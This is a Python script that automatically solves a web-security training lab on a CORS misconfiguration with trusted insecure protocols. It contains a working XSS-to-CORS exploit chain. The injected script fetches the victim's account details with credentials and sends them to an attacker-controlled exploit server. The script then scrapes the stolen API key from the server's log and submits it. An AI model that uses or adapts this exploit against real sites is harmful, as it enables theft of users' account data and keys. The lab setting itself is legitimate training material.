import requests, urllib3, re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "CORS vulnerability with trusted insecure protocols"

def run(url, payload, proxies=None):
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    url = url.rstrip('/')
    domain = url.replace("https://", "")
    user_input = input("[?] Enter the exploit server URL: ").strip()
    payload = f"""<script>
                    document.location = "http://stock.{domain}?productId=<script> fetch('{url}/accountDetails', {{ method: 'GET', credentials: 'include' }}).then(response => response.text()).then(data => {{ fetch('{user_input}/log?key=' %2b data); }}); </script%3e&storeId=1"
                </script>"""

    data = {"responseBody": payload, "responseHead": response_head,
            "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit"}

    try:
        r = requests.post(user_input.rstrip('/'), data,
                          verify=False, proxies=proxies)
        log_page = requests.get(f"{user_input}/log", verify=False, proxies=proxies)

        api_key =  re.findall("apikey%22:%20%22(.*)%22,", log_page.text)[0]

        print("[+] API key = " + Fore.YELLOW + api_key)
        print("[*] Submitting the solution")

        data = {"answer": api_key}

        r = requests.post(f"{url}/submitSolution", data)

        res = r.text
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
